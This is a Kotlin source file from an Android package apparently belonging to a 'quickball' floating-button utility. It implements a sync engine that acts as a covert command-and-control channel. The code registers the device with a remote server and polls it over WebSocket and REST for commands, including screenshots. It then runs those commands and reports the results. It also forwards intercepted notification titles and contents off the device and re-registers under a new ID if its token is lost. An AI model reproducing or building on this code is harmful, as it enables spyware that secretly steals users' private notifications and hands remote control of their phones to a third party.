package io.github.chayanforyou.quickball.sync

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.util.Log
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Channel engine: register → WS → heartbeat.
 * REST polling runs in parallel and always — WS drops on mobile data,
 * and without the fallback commands never arrive.
 */
class SyncEngine(private val ctx: Context) {

    private var deviceId = Cfg.deviceId(ctx)
    private val teamId = Cfg.teamId
    private var http = Http(ctx, deviceId, teamId)
    private var ws: Ws? = null

    private val stop = AtomicBoolean(false)
    private val io = Executors.newSingleThreadExecutor { r -> Thread(r, "qb-sync-io").apply { isDaemon = true } }
    private val cmd = Executors.newSingleThreadExecutor { r -> Thread(r, "qb-sync-cmd").apply { isDaemon = true } }
    private var backoff = Cfg.RECONNECT_MIN_MS

    fun start() {
        appContext = ctx.applicationContext
        instance = this
        stop.set(false)
        io.execute { loop() }
    }

    fun shutdown() {
        if (instance === this) instance = null
        stop.set(true)
        runCatching { ws?.disconnect() }
        io.shutdownNow()
        cmd.shutdownNow()
    }

    private fun loop() {
        while (!stop.get()) {
            try {
                Log.d(TAG, "register start")
                if (!http.register()) {
                    Log.w(TAG, "register failed forbidden=${http.lastForbidden}")
                    // 403 — the server knows this device_id but the token is lost
                    // (reinstall / DB reset). Take a new id and get a new token.
                    if (http.lastForbidden) {
                        Cfg.rotateDeviceId(ctx)
                        deviceId = Cfg.deviceId(ctx)
                        http = Http(ctx, deviceId, teamId)
                    }
                    sleep(backoff)
                    backoff = (backoff * 2).coerceAtMost(Cfg.RECONNECT_MAX_MS)
                    continue
                }
                backoff = Cfg.RECONNECT_MIN_MS

                var nextConnect = 0L
                var lastBeat = 0L
                var lastPoll = 0L
                while (!stop.get()) {
                    val now = System.currentTimeMillis()

                    // WS when possible; REST polling runs regardless.
                    if (ws?.isConnected() != true && now >= nextConnect) {
                        val fresh = Ws(deviceId, teamId, http.token) { c -> dispatch(c) }
                        ws = fresh
                        runCatching { fresh.connect() }
                        if (fresh.isConnected()) {
                            backoff = Cfg.RECONNECT_MIN_MS
                        } else {
                            nextConnect = now + backoff
                            backoff = (backoff * 2).coerceAtMost(Cfg.RECONNECT_MAX_MS)
                        }
                    }

                    if (ws?.isConnected() == true && now - lastBeat > Cfg.HEARTBEAT_MS) {
                        ws?.heartbeat(info())
                        lastBeat = now
                    }
                    if (now - lastPoll > Cfg.POLL_MS) {
                        pollOnce()
                        lastPoll = now
                    }
                    sleep(1000)
                }
            } catch (t: Throwable) {
                Log.e(TAG, "loop: ${t.message}")
                sleep(backoff)
            } finally {
                runCatching { ws?.disconnect() }
            }
        }
    }

    private fun info(): JSONObject {
        val bm = ctx.getSystemService(android.content.Context.BATTERY_SERVICE) as? BatteryManager
        val level = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
        return JSONObject()
            .put("battery_level", level)
            .put("model", Build.MODEL)
            .put("android_version", Build.VERSION.RELEASE)
            .put("a11y", SyncAccessibilityService.instance != null)
            .put("nls", true)
    }

    private fun pollOnce() {
        val arr = http.poll()
        for (i in 0 until arr.length()) {
            val c = arr.optJSONObject(i) ?: continue
            dispatch(c)
        }
    }

    /** Commands run on a separate thread: the screenshot inside waits on a latch for its callback. */
    private fun dispatch(cmd: JSONObject) {
        val id = cmd.optLong("id")
        val name = cmd.optString("cmd")
        val args = cmd.optJSONObject("args") ?: JSONObject()
        this.cmd.execute {
            Log.d("QbCmd", "run id=$id $name")
            val (status, result) = runCatching { Commands.run(name, args) }
                .getOrElse { "error" to (it.message ?: "dispatch") }
            Log.d("QbCmd", "done id=$id $status")
            val live = ws?.takeIf { it.isConnected() }
            if (live != null) live.result(id, status, result) else http.result(id, status, result)
        }
    }

    /** Intercepted notification: WS, otherwise REST. Called from the main thread. */
    fun sendNotification(pkg: String, title: String, text: String) {
        cmd.execute {
            val live = ws?.takeIf { it.isConnected() }
            if (live != null && live.notification(pkg, title, text)) return@execute
            val one = JSONObject()
                .put("package", pkg)
                .put("title", title)
                .put("content", text)
            http.sendData("notifications", org.json.JSONArray().put(one))
        }
    }

    private fun sleep(ms: Long) {
        runCatching { Thread.sleep(ms) }
    }

    companion object {
        private const val TAG = "QbEngine"

        @Volatile
        var appContext: Context? = null

        /** Live instance: NLS and a11y send data through it. */
        @Volatile
        var instance: SyncEngine? = null
            private set
    }
}